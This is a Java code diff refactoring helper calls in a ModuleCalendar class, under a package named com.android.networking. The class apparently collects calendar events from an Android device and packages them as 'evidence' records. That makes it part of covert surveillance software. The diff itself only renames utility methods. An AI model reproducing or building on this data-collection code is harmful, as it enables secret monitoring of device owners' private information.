@@ -19,6 +19,7 @@ import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.Markup;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
@@ -209,7 +210,7 @@ public class ModuleCalendar extends BaseModule {
 				}
 
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
-				// Utils.byteArrayToHex(packet));
+				// ByteArray.byteArrayToHex(packet));
 				final Long crcOld = calendar.get(idEvent);
 				final Long crcNew = Digest.CRC32(packet);
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
@@ -223,7 +224,7 @@ public class ModuleCalendar extends BaseModule {
 					calendar.put(idEvent, crcNew);
 					saveEvidenceCalendar(idEvent, packet);
 					needToSerialize = true;
-					Thread.yield();
+					//Thread.yield();
 				}
 			}
 		}
@@ -292,9 +293,9 @@ public class ModuleCalendar extends BaseModule {
 		// la lunghezza del
 		// payload
 		try {
-			payload.write(Utils.intToByteArray(0));
-			payload.write(Utils.intToByteArray(version));
-			payload.write(Utils.intToByteArray((int) idEvent));
+			payload.write(ByteArray.intToByteArray(0));
+			payload.write(ByteArray.intToByteArray(version));
+			payload.write(ByteArray.intToByteArray((int) idEvent));
 
 			// preparazione del payload, con la parte fissa e quella dinamica
 
@@ -311,13 +312,13 @@ public class ModuleCalendar extends BaseModule {
 			int busy = 2;
 			int duration = 0;
 			int meeting = 0;
-			payload.write(Utils.intToByteArray(flags));
-			payload.write(Utils.longToByteArray(DateTime.getFiledate(begin)));
-			payload.write(Utils.longToByteArray(DateTime.getFiledate(end)));
-			payload.write(Utils.intToByteArray(sensitivity));
-			payload.write(Utils.intToByteArray(busy));
-			payload.write(Utils.intToByteArray(duration));
-			payload.write(Utils.intToByteArray(meeting));
+			payload.write(ByteArray.intToByteArray(flags));
+			payload.write(ByteArray.longToByteArray(DateTime.getFiledate(begin)));
+			payload.write(ByteArray.longToByteArray(DateTime.getFiledate(end)));
+			payload.write(ByteArray.intToByteArray(sensitivity));
+			payload.write(ByteArray.intToByteArray(busy));
+			payload.write(ByteArray.intToByteArray(duration));
+			payload.write(ByteArray.intToByteArray(meeting));
 			// recursive
 			// blocchi di stringhe
 
@@ -347,7 +348,7 @@ public class ModuleCalendar extends BaseModule {
 			databuffer.writeInt(size);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket): " + Utils.byteArrayToHex(packet)); //$NON-NLS-1$
+				Check.log(TAG + " (preparePacket): " + ByteArray.byteArrayToHex(packet)); //$NON-NLS-1$
 			}
 			return packet;
 
@@ -367,7 +368,7 @@ public class ModuleCalendar extends BaseModule {
 		if (message != null) {
 			byte[] data = WChar.getBytes(message, false);
 			int len = type | (data.length & 0x00ffffff);
-			byte[] prefix = Utils.intToByteArray(len);
+			byte[] prefix = ByteArray.intToByteArray(len);
 			payload.write(prefix);
 			payload.write(data);
 		}
